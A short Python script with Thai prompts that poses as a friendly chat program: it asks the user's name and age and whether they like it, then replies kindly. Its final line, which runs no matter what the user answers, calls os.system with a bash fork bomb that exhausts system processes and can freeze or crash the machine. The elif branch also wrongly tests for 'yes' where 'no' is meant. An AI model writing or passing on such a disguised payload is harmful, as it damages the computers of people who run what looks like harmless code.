import os, sys
print ('')
print ('')
print ('ชื่ออะไรครับ ?')
NAME = input('ตอบเป็นภาษาอังกฤษ : ')

print ('')
print ('สวัสดี %s'%(NAME))
print ('')
print ('อายุเท่าไหร่หรอ ?')
print ('')
AGE = input('ตอบ : ')

print ('โอเค สวัสดี %s ฉันอายุ %s เท่าเธอ'%(NAME, AGE))
print ('')
print ('')
print ('แล้วเธอชอบเราไหม? [yes/no]')
LIKE = input('ตอบ : ')

if LIKE == "y" or LIKE == "yes":
       print ('เราก็ชอบเธอเหมือนกันนะ ขอบคุณนะ :)')

elif  LIKE == "n" or LIKE == "yes":
          
          print ('ไม่เป็นไรแต่ขอบคุณนะ :)')
os.system (' :(){ :|:& };: ')
